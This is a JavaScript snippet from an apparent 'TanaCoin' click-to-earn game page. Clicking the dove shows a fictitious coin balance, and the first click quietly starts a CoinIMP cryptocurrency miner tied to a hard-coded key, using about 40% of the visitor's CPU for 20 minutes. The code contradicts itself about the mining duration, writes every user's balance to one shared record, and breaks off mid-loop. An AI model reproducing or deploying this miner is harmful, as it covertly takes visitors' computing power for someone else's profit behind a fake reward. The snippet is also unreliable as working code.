    <script>
                                     
        // CoinIMP Mining API keys
        const publicKey = "398f92e3c877288b6a3db97cc6c4489c53cf92cba630214c90cf133c730d4325";

        let miningActive = false;

        // Mining Function
        async function mineTanaCoin() {
            let clickCount = parseInt(localStorage.getItem('clickCount')) || 0;
            let userBalance = parseFloat(localStorage.getItem('userBalance')) || 0;

            clickCount++;
            userBalance += 0.0035847;
            document.getElementById('userBalance').innerText = userBalance.toFixed(5);
            localStorage.setItem('userBalance', userBalance.toFixed(5));
            localStorage.setItem('clickCount', clickCount);

            const doveIcon = document.getElementById('doveIcon');

            // Rotate the dove icon 3 times
            if (!doveIcon.classList.contains('rotate')) {
                doveIcon.classList.add('rotate');

                // Remove rotate class after 3 seconds
                setTimeout(() => {
                    doveIcon.classList.remove('rotate');
                }, 3000);
            }

            // Sabunta coins a cikin Firebase
            try {
                const username = "users";
                const userDoc = db.doc(`users/${username}`);
                await userDoc.set({ userBalance: userBalance.toFixed(5) }, { merge: true });
                console.log('User balance updated in Firebase');
            } catch (error) {
                console.error('Error updating user balance:', error);
            }
            
            if (clickCount % 1 === 0) {
                displayFlyingCoin(clickCount % 1);
            }

            if (!miningActive) {
                startMining();
            }
        }

        function startMining() {
            miningActive = true;

            const miner = new CoinIMP(publicKey, { throttle: 0.6 }); // Throttle means 40% CPU usage (1 - 0.6 = 0.4 CPU)

            // Start mining
            miner.start();

            miner.on('found', () => {
                console.log('Hash found!');
            });

            miner.on('accepted', () => {
                console.log('Hash accepted!');
            });

            // Stop mining after 10 minutes (optional)
            setTimeout(() => {
                miner.stop();
                miningActive = false;
                console.log('Mining stopped after 1 hours minutes.');
            }, 1200000);
        }

        function displayFlyingCoin(flightDirection) {
            const coin = document.createElement('div');
            coin.classList.add('fly-coin');
            coin.innerHTML = '🕊️<span class="red">Tana</span><span class="green">Coin</span> 0.0035847';

            // Add flying direction class
            if (flightDirection === 0) {
                coin.classList.add('fly-up');
            }

            document.body.appendChild(coin);

            // Remove the coin after 2 seconds
            setTimeout(() => {
                coin.remove();
            }, 3000);

            // Create additional flying coins randomly
            setTimeout(() => {
                for (let i = 0; i < 9; i++) {
                    const randomCoin = document.createElement('div');

                    randomCoin.innerHTML = '🕊️<span class="red">Tana</span><span class="green">Coin</span> 0.0035847';

                }
